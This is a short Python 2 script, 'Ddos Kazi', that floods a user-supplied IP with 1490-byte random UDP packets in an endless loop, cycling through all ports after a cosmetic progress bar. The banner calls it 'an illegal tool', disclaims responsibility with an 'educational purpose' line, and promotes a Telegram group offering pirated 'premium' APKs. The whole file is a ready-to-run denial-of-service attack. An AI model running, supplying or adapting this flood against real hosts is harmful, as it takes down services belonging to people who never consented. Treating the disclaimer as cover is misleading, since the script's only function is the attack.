print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Ddos Kazi")
print
print "Coded By : KAZI ASHRFUZZAMAN "
print "Author   : CNPI CYBER COMMUNITY"
print "Github   : https://github.com/SilentVirtualCriminalGang.git"
print "Fb Page  : facebook.com/MR.ERROR.HERE"
print "FB Group : No group!"
print "Telegram : t.me/Big_Boss_SK"
print "Join Cracker Space TG Group To Get Premium Apk(s) Free"
print "Don't copy my code!It's me Kazi the cyber gamer :)"
print
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print("Team : CNPI CYBER COMMUNITY")
print ("\033[92m")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Kazi sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

